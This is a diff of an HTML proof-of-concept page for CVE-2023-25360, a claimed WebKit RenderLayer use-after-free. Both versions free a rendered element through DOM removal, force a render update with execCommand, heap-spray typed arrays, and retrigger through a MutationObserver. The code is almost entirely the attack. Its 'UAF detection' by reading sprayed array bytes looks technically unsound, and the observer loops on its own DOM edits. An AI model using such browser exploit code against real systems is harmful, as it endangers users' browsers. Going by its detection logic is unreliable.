@@ -6,101 +6,98 @@
     <title>CVE-2023-25360 PoC</title>
     <style>
         #target {
-            position: absolute; /* Forces RenderLayer creation */
-            width: 100px;
-            height: 100px;
-            background: blue;
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            overflow: auto;
+            background: green;
         }
         button {
-            margin-top: 20px;
-            padding: 10px;
-            font-size: 16px;
+            margin: 20px 0;
+            padding: 12px;
+            font-size: 18px;
+            cursor: pointer;
         }
         #status {
             margin-top: 10px;
             font-weight: bold;
+            color: navy;
         }
     </style>
 </head>
 <body>
-    <h1>CVE-2023-25360: WebCore::RenderLayer UAF</h1>
-    <p>Click the button to trigger the PoC. Browser may crash or show UAF detection.</p>
+    <h1>CVE-2023-25360: RenderLayer UAF</h1>
+    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
     <button id="trigger">Trigger PoC</button>
-    <div id="status">Waiting...</div>
-    <div id="container">
+    <div id="status">Idle...</div>
+    <div id="parent">
         <div id="target"></div>
     </div>
-    <script type="module">
-        import { debug_log } from './module/utils.mjs';
-
-        const container = document.getElementById('container');
+    <script>
+        const parent = document.getElementById('parent');
         const target = document.getElementById('target');
         const status = document.getElementById('status');
-        const DELAY = 100;
-        let attemptCount = 0;
+        let attempts = 0;
 
-        function heapSpray() {
-            let spray = [];
-            for (let i = 0; i < 10000; i++) {
-                let arr = new Uint8Array(0x1000);
-                for (let j = 0; j < arr.length; j++) {
-                    arr[j] = 0x41; // Fill with 'A'
-                }
-                spray.push(arr);
+        function sprayHeap() {
+            const arrays = [];
+            for (let i = 0; i < 15000; i++) {
+                const buf = new Uint8Array(4096);
+                buf.fill(0x42); // Fill with 'B'
+                arrays.push(buf);
             }
-            return spray;
+            return arrays;
         }
 
-        function triggerUAF() {
-            attemptCount++;
-            debug_log(`Attempt #${attemptCount}: Initiating exploit...`);
-            status.textContent = `Attempt #${attemptCount} in progress...`;
+        function triggerExploit() {
+            attempts++;
+            console.log(`Attempt ${attempts}: Starting...`);
+            status.textContent = `Attempt ${attempts} running...`;
 
-            // Step 1: Modify DOM to create and remove elements
-            target.style.display = 'block'; // Ensure RenderLayer exists
-            container.removeChild(target); // Trigger RenderLayer destruction
+            // Step 1: Manipulate DOM to free RenderLayer
+            target.style.display = 'block';
+            parent.removeChild(target);
 
-            // Step 2: Execute command to update styles and render tree
+            // Step 2: Trigger style and render tree update
             setTimeout(() => {
                 try {
-                    // Re-add target to trigger style recalculation
-                    container.appendChild(target);
-                    // Use execCommand to force style and render tree update
-                    document.execCommand('fontSize', false, '7');
-                    // Heap spray to increase crash likelihood
-                    const spray = heapSpray();
+                    // Re-add element to force style recalc
+                    parent.appendChild(target);
+                    // execCommand to trigger render tree update
+                    document.execCommand('fontSize', false, '5');
+                    // Spray heap
+                    const arrays = sprayHeap();
                     // Check for UAF
-                    debug_log('Checking for UAF memory reuse...');
-                    for (let i = 0; i < spray.length; i++) {
-                        const arr = spray[i];
-                        if (arr[0] !== 0x41) {
-                            debug_log(`UAF detected at spray index: ${i}`);
+                    console.log('Scanning for UAF...');
+                    for (let i = 0; i < arrays.length; i++) {
+                        if (arrays[i][0] !== 0x42) {
+                            console.log(`UAF found at index ${i}`);
                             status.textContent = 'UAF detected!';
                             return;
                         }
                     }
-                    debug_log('UAF triggered, check for crash or memory corruption.');
-                    status.textContent = 'Exploit triggered!';
-                } catch (e) {
-                    debug_log(`Error occurred: ${e.message}`);
-                    status.textContent = 'Error: Exploit failed.';
+                    console.log('Exploit attempt completed, check for crash.');
+                    status.textContent = 'Exploit attempted!';
+                } catch (err) {
+                    console.error(`Error: ${err.message}`);
+                    status.textContent = 'Failed: Error occurred.';
                 }
-            }, DELAY);
+            }, 50);
         }
 
-        const observer = new MutationObserver((mutations) => {
-            debug_log('DOM tree modified, attempting UAF exploit...');
-            triggerUAF();
+        const observer = new MutationObserver(() => {
+            console.log('DOM changed, retrying exploit...');
+            triggerExploit();
         });
 
-        observer.observe(container, { childList: true, subtree: true });
+        observer.observe(parent, { childList: true, subtree: true });
 
         document.getElementById('trigger').addEventListener('click', () => {
             try {
-                triggerUAF();
-            } catch (e) {
-                debug_log(`Error occurred: ${e.message}`);
-                status.textContent = 'Error: Exploit failed.';
+                triggerExploit();
+            } catch (err) {
+                console.error(`Error: ${err.message}`);
+                status.textContent = 'Failed: Error occurred.';
             }
         });
     </script>
